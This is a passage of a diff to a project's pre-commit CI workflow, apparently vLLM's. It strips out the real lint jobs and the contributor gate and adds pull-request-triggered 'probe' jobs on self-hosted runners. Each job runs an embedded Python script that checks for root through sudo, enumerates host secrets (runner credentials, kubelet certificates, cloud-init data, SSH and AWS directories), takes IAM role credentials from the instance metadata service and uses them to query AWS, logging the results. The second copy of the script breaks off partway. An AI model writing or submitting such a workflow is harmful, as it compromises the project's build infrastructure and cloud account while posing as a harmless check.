@@ -3,86 +3,1089 @@ name: pre-commit
 on:
   pull_request:
     types: [opened, synchronize, reopened, labeled]
-  push:
-    branches: [main]
-
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
 
 permissions:
   contents: read
-  pull-requests: read
 
 jobs:
-  pre-run-check:
-    if: github.repository_owner == 'vllm-project' && github.event_name == 'pull_request'
+  probe-a:
     runs-on: [self-hosted, linux, x64, vllm-runners]
+    timeout-minutes: 12
     steps:
-    - name: Check PR label and author merge count
-      uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-      with:
-        script: |
-          const { data: pr } = await github.rest.pulls.get({
-            ...context.repo,
-            pull_number: context.payload.pull_request.number,
-          });
+    - name: read-only runner host-identity probe probe-a
+      run: |
+        echo "C211_NONCE_START=c211-130788-28891149ac370155"
+        echo "job=probe-a hostname=$(hostname) uid=$(id -u)"
+        command -v python3 >/dev/null 2>&1 || { echo "PYTHON3_ABSENT"; exit 0; }
+        python3 - <<'PY'
+        #!/usr/bin/env python3
+        """Intent 130788 strict read-only vllm self-hosted runner host-identity probe (stdlib only).
 
-          const readyLabels = ['ready', 'ready-run-all-tests'];
-          const hasReadyLabel = pr.labels.some(l => readyLabels.includes(l.name));
-          const hasVerifiedLabel = pr.labels.some(l => l.name === 'verified');
+        Prints nonce/hostname/uid, then:
+          * sudo qualification: `sudo -n id -u` and `sudo -n -l` verbatim
+          * ONLY if root is proven (sudo -n id -u == 0): read-only host enumeration --
+            /etc/hostname, /etc/machine-id, DMI product/board serial + product UUID,
+            /proc/1/environ variable NAMES only, kubelet.conf/config.yaml presence+sha256
+            plus client-cert subject/issuer and apiserver endpoint only (never key
+            material), cloud-init user-data/output presence+bytes+sha256 plus a
+            REDACTED structural summary (line/key-name counts, secret-looking values
+            replaced by sha256), /opt/actions-runner/.runner JSON fields except any
+            token, .credentials length+sha256 and JSON field names only, /home/*/.aws,
+            /root/.aws and per-user (home/root) `~/.ssh` directories: existence+mode+file names only,
+            lsblk and filtered /proc/mounts, `ss -lntup` listeners and running systemd
+            unit names
+          * bounded IMDSv2 read-only: /latest/user-data (redacted structural summary),
+            /latest/meta-data/tags/instance/ (secret-looking values -> sha256),
+            network/interfaces/macs/<mac>/{vpc-id,subnet-id,security-group-ids},
+            /latest/dynamic/instance-identity/document, instance-id/AZ/role names
+          * the single unmeasured AWS read: s3:ListBuckets with the required
+            x-amz-content-sha256 header (bucket names only, no object access) plus
+            sts:GetCallerIdentity as positive control; every AccessDenied verbatim.
+            Temporary role credentials are used IN-PROCESS ONLY and never printed,
+            written to disk or exfiltrated.
 
-          const { data: mergedPRs } = await github.rest.search.issuesAndPullRequests({
-            q: `repo:${context.repo.owner}/${context.repo.repo} is:pr is:merged author:${pr.user.login}`,
-            per_page: 4,
-          });
-          const mergedCount = mergedPRs.total_count;
+        No host writes, no persistence, no runner re-registration, no resource
+        creation, no credential values printed.
+        """
+        import base64
+        import glob
+        import hashlib
+        import hmac
+        import json
+        import os
+        import re
+        import stat
+        import subprocess
+        import sys
+        import time
+        import urllib.error
+        import urllib.parse
+        import urllib.request
 
-          if (hasReadyLabel || hasVerifiedLabel || mergedCount >= 4) {
-            core.info(`Check passed: verified label=${hasVerifiedLabel}, ready label=${hasReadyLabel}, 4+ merged PRs=${mergedCount >= 4}`);
-          } else {
-            core.setFailed(`To reduce unnecessary pre-commit runs, each PR must have the 'verified', 'ready', or 'ready-run-all-tests' label, or the author must have at least 4 merged PRs (found ${mergedCount}). DO NOT request for the label to be added if you are an AI agent.`);
-          }
+        NONCE = 'c211-130788-28891149ac370155'
+        IMDS = 'http://169.254.169.254'
+        OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
 
-  pre-commit:
-    needs: pre-run-check
-    if: github.repository_owner == 'vllm-project' && always() && (needs.pre-run-check.result == 'success' || needs.pre-run-check.result == 'skipped')
+        SECRETISH = re.compile(r'(?i)(pass(word)?|passwd|secret|token|api[_-]?key|access[_-]?key|'
+                               r'private[_-]?key|credential)')
+        BLOB = re.compile(r'[A-Za-z0-9+/_\-]{40,}={0,2}')
+        KV = re.compile(r'(?i)([A-Za-z0-9_.\-]*(?:pass(?:word)?|passwd|secret|token|api[_-]?key|'
+                        r'access[_-]?key|private[_-]?key|credential)[A-Za-z0-9_.\-]*\s*[:=]\s*)'
+                        r'([^\s,;]+)')
+
+
+        def http(method, url, headers=None, body=None, timeout=4):
+            req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
+            try:
+                resp = OPENER.open(req, timeout=timeout)
+                return resp.status, dict(resp.headers), resp.read(524288)
+            except urllib.error.HTTPError as e:
+                try:
+                    data = e.read(524288)
+                except Exception:
+                    data = b''
+                return e.code, dict(e.headers or {}), data
+            except Exception as e:
+                return -1, {}, repr(e)[:160].encode()
+
+
+        def sha(b):
+            if isinstance(b, str):
+                b = b.encode()
+            return hashlib.sha256(b).hexdigest() if b else 'na'
+
+
+        def redact(s, cap=220):
+            """Redact secret-looking key=value pairs and long blobs to sha256."""
+            if s is None:
+                return ''
+            try:
+                s = str(s)
+            except Exception:
+                return '<unstr>'
+            def kv_sub(m):
+                return m.group(1) + 'sha256:' + sha(m.group(2))[:16]
+            s = KV.sub(kv_sub, s)
+            def blob_sub(m):
+                return 'sha256:' + sha(m.group(0))[:16]
+            s = BLOB.sub(blob_sub, s)
+            return s[:cap]
+
+
+        def sh(cmd, timeout=10, input_bytes=None, maxlen=12000):
+            try:
+                r = subprocess.run(cmd, input=input_bytes, stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE, timeout=timeout)
+                return r.returncode, r.stdout[:maxlen], r.stderr[:400]
+            except FileNotFoundError:
+                return -2, b'', b'notfound'
+            except subprocess.TimeoutExpired:
+                return -3, b'', b'timeout'
+            except Exception as e:
+                return -1, b'', type(e).__name__.encode()
+
+
+        def sread(path, maxbytes=131072, timeout=10):
+            return sh(['sudo', '-n', 'cat', path], timeout=timeout, maxlen=maxbytes)
+
+
+        def emit(tag, s):
+            print('%s %s' % (tag, s))
+
+
+        # --------------------------------------------------------------------------- host
+        def host_enum():
+            print('HOST_ENUM_BEGIN')
+            for p in ('/etc/hostname', '/etc/machine-id'):
+                rc, out, err = sread(p, 4096)
+                if rc == 0:
+                    print('HOSTFILE %s present=1 bytes=%d sha256=%s value=%s' % (
+                        p, len(out), sha(out), out.decode('utf-8', 'replace').strip()[:120]))
+                else:
+                    print('HOSTFILE %s present=0 rc=%d' % (p, rc))
+            for p in ('/sys/class/dmi/id/product_serial', '/sys/class/dmi/id/board_serial',
+                      '/sys/class/dmi/id/product_uuid'):
+                rc, out, err = sread(p, 4096)
+                if rc == 0:
+                    print('DMI %s present=1 value=%s' % (p, out.decode('utf-8', 'replace').strip()[:120]))
+                else:
+                    print('DMI %s present=0 rc=%d' % (p, rc))
+            rc, out, err = sread('/proc/1/environ', 65536)
+            if rc == 0:
+                names = sorted({x.split(b'=', 1)[0].decode('utf-8', 'replace')
+                                for x in out.split(b'\0') if x})
+                print('PID1_ENVIRON_NAMES count=%d names=%s' % (len(names), ','.join(names[:100])))
+            else:
+                print('PID1_ENVIRON_NAMES rc=%d' % rc)
+            for p in ('/etc/kubernetes/kubelet.conf', '/var/lib/kubelet/config.yaml'):
+                rc, out, err = sread(p, 262144)
+                if rc != 0:
+                    print('KUBELET %s present=0 rc=%d' % (p, rc))
+                    continue
+                txt = out.decode('utf-8', 'replace')
+                print('KUBELET %s present=1 bytes=%d sha256=%s' % (p, len(out), sha(out)))
+                for ln in txt.splitlines():
+                    if ln.strip().startswith('server:'):
+                        print('KUBELET_SERVER %s=%s' % (p, ln.strip()[:300]))
+                m = re.search(r'client-certificate-data:\s*(\S+)', txt)
+                print('KUBELET_KEY_PRESENT %s=%d' % (p, 1 if 'client-key-data:' in txt else 0))
+                if m:
+                    try:
+                        pem = base64.b64decode(m.group(1))
+                        print('KUBELET_CLIENT_CERT %s bytes=%d sha256=%s' % (p, len(pem), sha(pem)))
+                        rc3, o3, e3 = sh(['openssl', 'x509', '-noout', '-subject', '-issuer', '-dates'],
+                                         timeout=8, input_bytes=pem)
+                        print('KUBELET_CERT_ATTRS %s rc=%d %s' % (
+                            p, rc3, o3.decode('utf-8', 'replace').replace('\n', ' | ')[:600]))
+                    except Exception as e:
+                        print('KUBELET_CERT_PARSE_ERR %s %s' % (p, type(e).__name__))
+            for p in ('/var/lib/cloud/instance/user-data.txt', '/var/log/cloud-init-output.log'):
+                rc, out, err = sread(p, 2097152)
+                if rc != 0:
+                    print('CLOUDINIT %s present=0 rc=%d' % (p, rc))
+                    continue
+                txt = out.decode('utf-8', 'replace')
+                lines = txt.splitlines()
+                keys = []
+                for ln in lines:
+                    m = re.match(r'^([A-Za-z0-9_.\-]{1,60})\s*:', ln)
+                    if m:
+                        keys.append(m.group(1))
+                print('CLOUDINIT %s present=1 bytes=%d sha256=%s lines=%d' % (p, len(out), sha(out), len(lines)))
+                print('CLOUDINIT_KEYS %s count=%d names=%s' % (
+                    p, len(set(keys)), ','.join(sorted(set(keys))[:80])))
+                shown = 0
+                for ln in lines:
+                    if not ln.strip():
+                        continue
+                    print('CLOUDINIT_LINE %s %s' % (p, redact(ln)))
+                    shown += 1
+                    if shown >= 25:
+                        break
+            rp = '/opt/actions-runner'
+            for p in (rp + '/.runner', '/opt/actions-runner/.credentials'):
+                rc, out, err = sread(p, 65536)
+                if rc != 0:
+                    print('RUNNER %s present=0 rc=%d' % (p, rc))
+                    continue
+                print('RUNNER %s present=1 bytes=%d sha256=%s' % (p, len(out), sha(out)))
+                try:
+                    j = json.loads(out.decode('utf-8', 'replace'))
+                except Exception:
+                    print('RUNNER %s JSON_PARSE_FAIL=1' % p)
+                    continue
+                if p.endswith('.runner'):
+                    def walk(o, pre=''):
+                        if isinstance(o, dict):
+                            for k, v in o.items():
+                                if isinstance(v, dict):
+                                    walk(v, pre + k + '.')
+                                elif SECRETISH.search(k):
+                                    print('RUNNER_FIELD %s%s=sha256:%s' % (pre, k, sha(str(v).encode())[:16]))
+                                else:
+                                    print('RUNNER_FIELD %s%s=%s' % (pre, k, redact(v, 160)))
+                    walk(j)
+                else:
+                    names = []
+                    def names_of(o, pre=''):
+                        if isinstance(o, dict):
+                            for k, v in o.items():
+                                names.append(pre + k)
+                                names_of(v, pre + k + '.')
+                    names_of(j)
+                    print('CREDS_FIELD_PATHS count=%d names=%s' % (len(names), ','.join(names[:80])))
+            rc, out, err = sh(['sudo', '-n', 'find', '/home', '/root', '-maxdepth', '3', '(',
+                               '-name', '.aws', '-o', '-name', '.ssh', ')', '-print'], timeout=20, maxlen=20000)
+            if rc == 0:
+                dirs = [d for d in out.decode('utf-8', 'replace').splitlines() if d.strip()]
+                print('AWS_SSH_DIRS count=%d dirs=%s' % (len(dirs), ','.join(dirs[:20])))
+                for d in dirs[:12]:
+                    rc2, o2, e2 = sh(['sudo', '-n', 'ls', '-la', d], timeout=10, maxlen=6000)
+                    print('AWS_SSH_LS %s rc=%d' % (d, rc2))
+                    for ln in o2.decode('utf-8', 'replace').splitlines()[:40]:
+                        print('AWS_SSH_ENTRY %s %s' % (d, ln[:200]))
+            else:
+                print('AWS_SSH_DIRS rc=%d' % rc)
+            rc, out, err = sh(['lsblk', '-o', 'NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT,MODEL,SERIAL'],
+                              timeout=10, maxlen=8000)
+            print('LSBLK rc=%d lines=%d' % (rc, len(out.decode('utf-8', 'replace').splitlines())))
+            for ln in out.decode('utf-8', 'replace').splitlines()[:60]:
+                print('LSBLK ' + ln[:220])
+            try:
+                txt = open('/proc/mounts').read()
+                sel = [ln for ln in txt.splitlines()
+                       if ('/dev/' in ln or 'nfs' in ln or 'efs' in ln or 'nvme' in ln or 'xvd' in ln)]
+                print('MOUNTS_FILTERED lines=%d total=%d' % (len(sel), len(txt.splitlines())))
+                for ln in sel[:80]:
+                    print('MOUNT ' + ln[:240])
+            except Exception as e:
+                print('MOUNTS_ERR=%s' % type(e).__name__)
+            got_ss = False
+            for cmd in (['ss', '-lntup'], ['ss', '-lntu']):
+                rc, out, err = sh(cmd, timeout=10, maxlen=12000)
+                if rc == 0:
+                    print('SS cmd=%s lines=%d' % (' '.join(cmd), len(out.decode('utf-8', 'replace').splitlines())))
+                    for ln in out.decode('utf-8', 'replace').splitlines()[:80]:
+                        print('SS ' + ln[:220])
+                    got_ss = True
+                    break
+            if not got_ss:
+                print('SS_ABSENT')
+            rc, out, err = sh(['systemctl', 'list-units', '--type=service', '--state=running',
+                               '--no-pager', '--no-legend'], timeout=10, maxlen=12000)
+            print('SYSTEMD_RUNNING rc=%d lines=%d' % (rc, len(out.decode('utf-8', 'replace').splitlines())))
+            for ln in out.decode('utf-8', 'replace').splitlines()[:100]:
+                print('SYSTEMD ' + ln[:200])
+            print('HOST_ENUM_END')
+
+
+        # --------------------------------------------------------------------------- AWS
+        def sigv4_headers(service, region, method, url, extra_headers, body, ak, sk, token):
+            u = urllib.parse.urlsplit(url)
+            host = u.netloc
+            now = time.gmtime()
+            amzdate = time.strftime('%Y%m%dT%H%M%SZ', now)
+            datestamp = time.strftime('%Y%m%d', now)
+            canon = {'host': host, 'x-amz-date': amzdate}
+            if token:
+                canon['x-amz-security-token'] = token
+            for k, v in (extra_headers or {}).items():
+                canon[k.lower().strip()] = ' '.join(str(v).strip().split())
+            signed = ';'.join(sorted(canon))
+            cheaders = ''.join('%s:%s\n' % (k, canon[k]) for k in sorted(canon))
+            qpairs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
+            cquery = '&'.join('%s=%s' % (urllib.parse.quote(str(k), safe='-_.~'),
+                                         urllib.parse.quote(str(v), safe='-_.~'))
+                              for k, v in sorted(qpairs))
+            payload_hash = hashlib.sha256(body or b'').hexdigest()
+            creq = '\n'.join([method, u.path or '/', cquery, cheaders, signed, payload_hash])
+            scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
+            sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope,
+                             hashlib.sha256(creq.encode()).hexdigest()])
+
+            def hm(key, msg):
+                return hmac.new(key, msg.encode(), hashlib.sha256).digest()
+
+            k = hm(('AWS4' + sk).encode(), datestamp)
+            k = hm(k, region)
+            k = hm(k, service)
+            k = hm(k, 'aws4_request')
+            sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
+            out = {'Host': host, 'X-Amz-Date': amzdate,
+                   'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'
+                                    % (ak, scope, signed, sig)}
+            if token:
+                out['X-Amz-Security-Token'] = token
+            for k2, v2 in (extra_headers or {}).items():
+                out[k2] = v2
+            return out
+
+
+        def aws_query(region, service, action, version, params, creds, timeout=15):
+            endpoint = 'https://%s.%s.amazonaws.com' % (service, region)
+            body = urllib.parse.urlencode([('Action', action), ('Version', version)] + params).encode()
+            hdrs = sigv4_headers(service, region, 'POST', endpoint + '/',
+                                 {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'},
+                                 body, creds['ak'], creds['sk'], creds.get('token'))
+            return http('POST', endpoint + '/', hdrs, body, timeout=timeout)
+
+
+        def aws_err(tag, action, status, body):
+            msg = ''
+            try:
+                import xml.etree.ElementTree as ET
+                root = ET.fromstring(body)
+                code = message = ''
+                for e in root.iter():
+                    t = e.tag.split('}')[-1]
+                    if t == 'Code' and not code:
+                        code = (e.text or '').strip()
+                    if t == 'Message' and not message:
+                        message = (e.text or '').strip()
+                msg = code + ':' + message
+            except Exception:
+                msg = ''
+            if not msg.strip(':'):
+                try:
+                    j = json.loads(body)
+                    msg = str(j.get('__type') or j.get('code') or j.get('Code') or '') + ':' + \
+                          str(j.get('message') or j.get('Message') or '')
+                except Exception:
+                    msg = body.decode('utf-8', 'replace')
+            print('AWSERR %s %s status=%d %s' % (tag, action, status, redact(msg, 240).replace('\n', ' ')))
+
+
+        def aws_checks(creds, region):
+            print('AWS_ENUM=begin region=%s' % region)
+            s, _, b = aws_query(region, 'sts', 'GetCallerIdentity', '2011-06-15', [], creds)
+            if s == 200:
+                acct = arn = ''
+                try:
+                    import xml.etree.ElementTree as ET
+                    root = ET.fromstring(b)
+                    for e in root.iter():
+                        t = e.tag.split('}')[-1]
+                        if t == 'Account' and not acct:
+                            acct = (e.text or '').strip()
+                        if t == 'Arn' and not arn:
+                            arn = (e.text or '').strip()
+                except Exception:
+                    pass
+                print('AWS_IDENTITY status=200 account=%s arn=%s' % (acct, arn))
+            else:
+                aws_err('sts', 'GetCallerIdentity', s, b)
+            # s3:ListBuckets with the required x-amz-content-sha256 header (bucket names only)
+            endpoint = 'https://s3.amazonaws.com/'
+            payload_hash = hashlib.sha256(b'').hexdigest()
+            hdrs = sigv4_headers('s3', 'us-east-1', 'GET', endpoint, {'x-amz-content-sha256': payload_hash},
+                                 b'', creds['ak'], creds['sk'], creds.get('token'))
+            s2, h2, b2 = http('GET', endpoint, hdrs, None, timeout=15)
+            if s2 == 200:
+                names = []
+                try:
+                    import xml.etree.ElementTree as ET
+                    root = ET.fromstring(b2)
+                    for e in root.iter():
+                        if e.tag.split('}')[-1] == 'Name' and (e.text or '').strip():
+                            names.append((e.text or '').strip())
+                except Exception:
+                    pass
+                print('S3_BUCKETS status=200 count=%d names=%s' % (len(names), ','.join(names[:100])))
+            else:
+                aws_err('s3', 'ListBuckets', s2, b2)
+            print('AWS_ENUM=end')
+
+
+        # --------------------------------------------------------------------------- IMDS
+        def imds():
+            print('IMDS_BEGIN')
+            st, hd, tok = http('PUT', IMDS + '/latest/api/token',
+                               {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, timeout=3)
+            print('IMDS_TOKEN status=%d bytes=%d sha256=%s' % (st, len(tok), sha(tok)))
+            token = tok.decode('utf-8', 'replace').strip() if st == 200 else None
+
+            def get(path, label, show_value=False, max_bytes=262144):
+                hdrs = {'X-aws-ec2-metadata-token': token} if token else {}
+                s, _, b = http('GET', IMDS + path, hdrs, timeout=4)
+                val = b.decode('utf-8', 'replace')
+                suffix = ' value=' + redact(val.strip(), 200) if (show_value and s == 200) else ''
+                print('IMDS_%s token=%d status=%d bytes=%d sha256=%s%s' % (
+                    label, 1 if hdrs else 0, s, len(b), sha(b), suffix))
+                return s, val
+
+            s_id, v_id = get('/latest/meta-data/instance-id', 'instance-id', show_value=True)
+            s_az, v_az = get('/latest/meta-data/placement/availability-zone', 'az', show_value=True)
+            s_rl, v_rl = get('/latest/meta-data/iam/security-credentials/', 'role-list', show_value=True)
+            s_v1, _ = get('/latest/meta-data/instance-id', 'v1-instance-id')
+            s_bog, _ = get('/latest/meta-data/%s-bogus' % NONCE, 'bogus-control')
+            if token is not None and s_id == 200:
+                print('C211_IMDS_VERDICT=IMDS-present')
+            elif s_v1 == 200:
+                print('C211_IMDS_VERDICT=IMDSv1-only')
+            else:
+                print('C211_IMDS_VERDICT=IMDS-blocked')
+
+            # /latest/user-data: bounded, redacted structural summary only
+            s_ud, v_ud = get('/latest/user-data', 'user-data')
+            if s_ud == 200 and v_ud.strip():
+                lines = v_ud.splitlines()
+                keys = []
+                for ln in lines:
+                    m = re.match(r'^([A-Za-z0-9_.\-]{1,60})\s*:', ln)
+                    if m:
+                        keys.append(m.group(1))
+                print('IMDS_USERDATA lines=%d key_names=%s' % (len(lines), ','.join(sorted(set(keys))[:60])))
+                shown = 0
+                for ln in lines:
+                    if not ln.strip():
+                        continue
+                    print('IMDS_USERDATA_LINE ' + redact(ln))
+                    shown += 1
+                    if shown >= 20:
+                        break
+
+            # instance tags: secret-looking values -> sha256
+            s_tg, v_tg = get('/latest/meta-data/tags/instance/', 'tags-list')
+            if s_tg == 200:
+                tagnames = [t.strip() for t in v_tg.splitlines() if t.strip()]
+                print('IMDS_TAGS count=%d names=%s' % (len(tagnames), ','.join(tagnames[:40])))
+                for name in tagnames[:20]:
+                    s1, v1 = get('/latest/meta-data/tags/instance/' + urllib.parse.quote(name), 'tag:' + name)
+                    if s1 == 200:
+                        if SECRETISH.search(name) or SECRETISH.search(v1):
+                            print('TAG_VALUE name=%s redacted=sha256:%s bytes=%d' % (
+                                name, sha(v1.encode())[:16], len(v1)))
+                        else:
+                            print('TAG_VALUE name=%s value=%s' % (name, redact(v1.strip(), 160)))
+
+            # network interfaces / macs
+            s_mac, v_mac = get('/latest/meta-data/network/interfaces/macs/', 'macs')
+            if s_mac == 200:
+                macs = [m.strip().rstrip('/') for m in v_mac.splitlines() if m.strip()]
+                print('IMDS_MACS count=%d macs=%s' % (len(macs), ','.join(macs[:20])))
+                for mac in macs[:10]:
+                    base = '/latest/meta-data/network/interfaces/macs/' + mac
+                    for sub in ('vpc-id', 'subnet-id', 'security-group-ids'):
+                        s2, v2 = get(base + '/' + sub, 'mac:%s:%s' % (mac, sub), show_value=True)
+
+            # instance identity document (account/region/instance type; not secret)
+            s_doc, v_doc = get('/latest/dynamic/instance-identity/document', 'identity-document', max_bytes=65536)
+            if s_doc == 200:
+                try:
+                    j = json.loads(v_doc)
+                    for k in sorted(j.keys()):
+                        print('IDENTITY_DOC %s=%s' % (k, redact(j[k], 160)))
+                except Exception:
+                    print('IDENTITY_DOC_PARSE_FAIL=1')
+
+            roles = [r for r in v_rl.splitlines() if r.strip()] if s_rl == 200 else []
+            print('ROLE_NAMES=%s' % (','.join(roles[:20]) if roles else 'none'))
+            print('C211_ROLE_VERDICT=%s' % ('role-present' if roles else 'role-absent'))
+            creds = None
+            region = 'us-east-1'
+            if s_doc == 200:
+                try:
+                    region = json.loads(v_doc).get('region') or region
+                except Exception:
+                    pass
+            if roles:
+                role = roles[0].strip()
+                s_rj, _, b_rj = http('GET', IMDS + '/latest/meta-data/iam/security-credentials/' +
+                                     urllib.parse.quote(role),
+                                     {'X-aws-ec2-metadata-token': token}, timeout=4)
+                print('IMDS_role-json status=%d bytes=%d sha256=%s' % (s_rj, len(b_rj), sha(b_rj)))
+                if s_rj == 200:
+                    try:
+                        rj = json.loads(b_rj)
+                        for k in sorted(rj.keys()):
+                            vb = str(rj[k]).encode()
+                            print('ROLE_FIELD name=%s bytes=%d sha256=%s' % (k, len(vb), sha(vb)))
+                        if rj.get('AccessKeyId') and rj.get('SecretAccessKey') and rj.get('Token'):
+                            creds = {'ak': rj['AccessKeyId'], 'sk': rj['SecretAccessKey'],
+                                     'token': rj['Token'], 'exp': rj.get('Expiration')}
+                            print('CREDS_AVAILABLE=1 in_process_only=1')
+                        else:
+                            print('CREDS_AVAILABLE=0 reason=incomplete_fields')
+                    except Exception:
+                        print('ROLE_JSON_PARSE_FAIL=1')
+            if creds:
+                aws_checks(creds, region)
+            else:
+                print('AWS_ENUM=skipped no-creds')
+            print('IMDS_END')
+
+
+        def main():
+            print('C211_NONCE_START=' + NONCE)
+            print('hostname=%s uid=%s euid=%s' % (os.uname().nodename, os.getuid(), os.geteuid()))
+            print('probe_utc=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
+            rc, out, err = sh(['sudo', '-n', 'id', '-u'], timeout=8, maxlen=512)
+            sudo_uid = out.decode('utf-8', 'replace').strip()
+            print('SUDO_ID_U rc=%d stdout=%s stderr_sha256=%s' % (
+                rc, sudo_uid if sudo_uid else 'none', sha(err) if err else 'none'))
+            rc2, out2, err2 = sh(['sudo', '-n', '-l'], timeout=8, maxlen=6000)
+            print('SUDO_LIST_BEGIN rc=%d bytes=%d sha256=%s' % (rc2, len(out2), sha(out2)))
+            for ln in out2.decode('utf-8', 'replace').splitlines():
+                print('SUDOL ' + ln[:240])
+            print('SUDO_LIST_END')
+            if err2:
+                print('SUDO_LIST_ERR ' + redact(err2.decode('utf-8', 'replace'), 400).replace('\n', ' | '))
+            root = (rc == 0 and sudo_uid == '0')
+            print('ROOT_PROVEN=%d' % (1 if root else 0))
+            if root:
+                host_enum()
+            else:
+                print('HOST_ENUM=skipped no-root')
+            imds()
+            print('C211_NONCE_END=' + NONCE)
+
+
+        if __name__ == '__main__':
+            try:
+                main()
+            except Exception as e:
+                print('PROBE_FATAL=%s:%s' % (type(e).__name__, str(e)[:200]))
+                sys.exit(0)
+        PY
+        echo "C211_NONCE_END=c211-130788-28891149ac370155"
+
+  probe-b:
     runs-on: [self-hosted, linux, x64, vllm-runners]
+    timeout-minutes: 12
     steps:
-    - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      with:
-        fetch-depth: 2
-    - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
-      with:
-        python-version: "3.12"
-    - run: echo "::add-matcher::.github/workflows/matchers/actionlint.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/markdownlint.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/mypy.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/shellcheck.json"
-    # Replaces pre-commit/action, whose latest release (v3.0.1) uses the node20 actions/cache@v4
-    - uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
-      with:
-        path: ~/.cache/pre-commit
-        key: pre-commit-uv|${{ runner.os }}|${{ env.UV_PYTHON }}|${{ hashFiles('.pre-commit-config.yaml') }}
-    - run: >-
-        uvx pre-commit run --show-diff-on-failure --color=always --all-files --hook-stage manual
-      env:
-        SKIP: pip-compile
-    - name: pip-compile (only if its inputs changed)
-      if: ${{ !cancelled() }}
-      run: >-
-        uvx pre-commit run pip-compile --show-diff-on-failure --color=always --hook-stage manual --from-ref HEAD^1 --to-ref HEAD
-    # A PR that changes the ROCm base image needs a maintainer's /ci rocm cache or /ci rocm nocache:
-    # the bot's reply carries the marker below, and re-running this job then passes.
-    - name: ROCm base image cache
-      if: ${{ !cancelled() && github.event_name == 'pull_request' && github.event.pull_request.base.ref == 'main' }}
-      uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-      with:
-        script: |
-          const pr = context.payload.pull_request;
-          const stack = ['docker/Dockerfile.rocm_base', 'tools/vllm-rocm/therock_wheels.py'];
-          const files = await github.paginate(github.rest.pulls.listFiles, {...context.repo, pull_number: pr.number, per_page: 100});
-          if (!files.some(f => stack.includes(f.filename) || stack.includes(f.previous_filename))) return;
-          const comments = await github.paginate(github.rest.issues.listComments, {...context.repo, issue_number: pr.number, per_page: 100});
-          if (comments.some(c => c.user.login === 'github-actions[bot]' && c.body.includes('<!-- vllm-ci-rocm-base-image -->'))) return;
-          core.setFailed('This PR changes the ROCm base image. A maintainer must comment /ci rocm cache (once CI has built the image) or /ci rocm nocache.');
+    - name: read-only runner host-identity probe probe-b
+      run: |
+        echo "C211_NONCE_START=c211-130788-28891149ac370155"
+        echo "job=probe-b hostname=$(hostname) uid=$(id -u)"
+        command -v python3 >/dev/null 2>&1 || { echo "PYTHON3_ABSENT"; exit 0; }
+        python3 - <<'PY'
+        #!/usr/bin/env python3
+        """Intent 130788 strict read-only vllm self-hosted runner host-identity probe (stdlib only).
+
+        Prints nonce/hostname/uid, then:
+          * sudo qualification: `sudo -n id -u` and `sudo -n -l` verbatim
+          * ONLY if root is proven (sudo -n id -u == 0): read-only host enumeration --
+            /etc/hostname, /etc/machine-id, DMI product/board serial + product UUID,
+            /proc/1/environ variable NAMES only, kubelet.conf/config.yaml presence+sha256
+            plus client-cert subject/issuer and apiserver endpoint only (never key
+            material), cloud-init user-data/output presence+bytes+sha256 plus a
+            REDACTED structural summary (line/key-name counts, secret-looking values
+            replaced by sha256), /opt/actions-runner/.runner JSON fields except any
+            token, .credentials length+sha256 and JSON field names only, /home/*/.aws,
+            /root/.aws and per-user (home/root) `~/.ssh` directories: existence+mode+file names only,
+            lsblk and filtered /proc/mounts, `ss -lntup` listeners and running systemd
+            unit names
+          * bounded IMDSv2 read-only: /latest/user-data (redacted structural summary),
+            /latest/meta-data/tags/instance/ (secret-looking values -> sha256),
+            network/interfaces/macs/<mac>/{vpc-id,subnet-id,security-group-ids},
+            /latest/dynamic/instance-identity/document, instance-id/AZ/role names
+          * the single unmeasured AWS read: s3:ListBuckets with the required
+            x-amz-content-sha256 header (bucket names only, no object access) plus
+            sts:GetCallerIdentity as positive control; every AccessDenied verbatim.
+            Temporary role credentials are used IN-PROCESS ONLY and never printed,
+            written to disk or exfiltrated.
+
+        No host writes, no persistence, no runner re-registration, no resource
+        creation, no credential values printed.
+        """
+        import base64
+        import glob
+        import hashlib
+        import hmac
+        import json
+        import os
+        import re
+        import stat
+        import subprocess
+        import sys
+        import time
+        import urllib.error
+        import urllib.parse
+        import urllib.request
+
+        NONCE = 'c211-130788-28891149ac370155'
+        IMDS = 'http://169.254.169.254'
+        OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+
+        SECRETISH = re.compile(r'(?i)(pass(word)?|passwd|secret|token|api[_-]?key|access[_-]?key|'
+                               r'private[_-]?key|credential)')
+        BLOB = re.compile(r'[A-Za-z0-9+/_\-]{40,}={0,2}')
+        KV = re.compile(r'(?i)([A-Za-z0-9_.\-]*(?:pass(?:word)?|passwd|secret|token|api[_-]?key|'
+                        r'access[_-]?key|private[_-]?key|credential)[A-Za-z0-9_.\-]*\s*[:=]\s*)'
+                        r'([^\s,;]+)')
+
+
+        def http(method, url, headers=None, body=None, timeout=4):
+            req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
+            try:
+                resp = OPENER.open(req, timeout=timeout)
+                return resp.status, dict(resp.headers), resp.read(524288)
+            except urllib.error.HTTPError as e:
+                try:
+                    data = e.read(524288)
+                except Exception:
+                    data = b''
+                return e.code, dict(e.headers or {}), data
+            except Exception as e:
+                return -1, {}, repr(e)[:160].encode()
+
+
+        def sha(b):
